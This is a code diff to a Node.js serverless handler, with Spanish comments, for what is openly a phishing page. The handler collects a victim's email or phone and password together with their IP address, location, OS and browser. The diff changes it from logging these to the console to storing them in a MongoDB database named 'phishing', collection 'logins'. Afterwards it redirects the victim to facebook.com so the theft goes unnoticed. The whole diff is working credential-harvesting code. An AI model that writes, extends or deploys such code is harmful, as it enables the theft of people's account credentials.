@@ -1,4 +1,5 @@
 const https = require('https');
+const { MongoClient } = require('mongodb');
 
 // Function to get real IP
 function getClientIP(req) {
@@ -50,20 +51,40 @@ export default async function handler(req, res) {
     });
   });
 
-  // Guardar en archivo (append). Añadimos timestamp.
+  // Preparar datos para guardar
   const now = new Date().toISOString();
   const safeEmail = email_or_phone.replace(/\r?\n/g, ' ');
   const safePass = password.replace(/\r?\n/g, ' ');
   const safeBrowser = browser.replace(/\r?\n/g, ' ');
   const safeOs = os.replace(/\r?\n/g, ' ');
   const safeLocation = location.replace(/\r?\n/g, ' ');
-  const line = `${now} | IP: ${ip} | Location: ${safeLocation} | OS: ${safeOs} | Browser: ${safeBrowser} | user: ${safeEmail} | pass: ${safePass}\n`;
+  const data = {
+    timestamp: now,
+    ip,
+    location: safeLocation,
+    os: safeOs,
+    browser: safeBrowser,
+    email: safeEmail,
+    password: safePass
+  };
 
-  // En lugar de escribir en archivo, loguear en consola (para serverless)
-  console.log(line);
-
-  // Opcional: Enviar a un webhook o base de datos
-  // Por ejemplo, a un webhook: https.post('https://your-webhook-url.com', { body: line });
+  // Conectar a MongoDB y guardar
+  const uri = process.env.MONGODB_URI;
+  if (uri) {
+    try {
+      const client = new MongoClient(uri);
+      await client.connect();
+      const db = client.db('phishing');
+      const collection = db.collection('logins');
+      await collection.insertOne(data);
+      await client.close();
+    } catch (error) {
+      console.error('Error saving to database:', error);
+    }
+  } else {
+    // Fallback to console.log if no DB URI
+    console.log(JSON.stringify(data));
+  }
 
   // Responder con JSON para que el cliente maneje la redirección
   res.status(200).json({ success: true, redirect: 'https://www.facebook.com/' });
